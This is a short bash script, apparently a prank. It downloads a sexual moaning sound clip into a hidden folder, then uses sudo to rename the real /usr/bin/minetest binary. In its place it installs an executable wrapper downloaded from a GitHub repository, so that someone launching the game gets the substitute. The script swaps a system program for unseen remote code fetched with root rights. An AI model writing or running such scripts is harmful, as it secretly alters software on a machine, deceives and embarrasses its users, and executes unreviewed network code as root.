#!/bin/bash
sudo pacman -Sy 
sudo pacman -S --needed mpg123 pactl

mkdir $HOME/.stoehntest/
cd $HOME/.stoehntest/

# sounddatei plazieren & umbenennen
wget "https://preview-downloads.customer.envatousercontent.com/files/506953403/preview.mp3?response-content-disposition=attachment;filename=53422218_sexy-girl-moaning-1_by_foleymaker_preview.mp3&Expires=2039356859&Signature=glVo8huZDAP1KyBuAkFfiWdS-uG06r4RibdSKWTDU8u-d31Gd1TuCi5g1A39kfqlzWHUOyZLsN7~ilpBNwjU3D-N5Ku5LH~1uVSSEFRe2eefsMap6jI7bFfbjQrvt1UNOzizPGM38qDp2fFUPXw07CdQDhEm6wIS787idjqRbhjVZ8X0W7bUnNTJaikqUprCqOCqsco7Fxb7Mii7pdOxvx997YecKBDjKYu6z4phwhcb~U8u4do5NT0cfWIu1gfViS4ls~ABw3t6FgmCzdjgFxqszOtQKZolnr67EuC9LRnOxn4rQaqKN7GSNpmH9DcJtvONykbTRHZqjZZPjdN36dMbkvtniFy9z6NfjffOWD1s3zUPdEDe2rD~evqZGvHXXpiWuUTgtIS9SuFqxTkfv7J07tgZ2j-835drwqup8msDch4i0ylJ2CI--RJ9PQS8Fn2gEoj~SNeXxm26zlYlfWsujCkF6VY4oa1-7JcdbWaw4yPK1C-2iCKcHShOCaNtk81N0aH6g0P~8aCqAdADQh3tbMHTBEUCIyTQ~B7vcpn7dk2gFU2H-qxC8K5O4ghXPoexIs6tMf5WRwbLTCjy4qVJc6JdfCQyms~kYo1XzKB9Y7yC4bbP2jBJj103pU6crNhcXnx2sEH5zVjBxsGDeiVa9a1742u55viWtm168SI_&Key-Pair-Id=APKAJRP2AVKNFZOM4BLQ"
mv preview.mp3* stoehn.mp3

# minetest verschieben & durch dummy ersetzen
sudo mv /usr/bin/minetest /usr/bin/minetest.real

sudo wget -P /usr/bin/ "https://raw.githubusercontent.com/CvWild/st-hntest/main/minetest"
sudo chmod +x /usr/bin/minetest
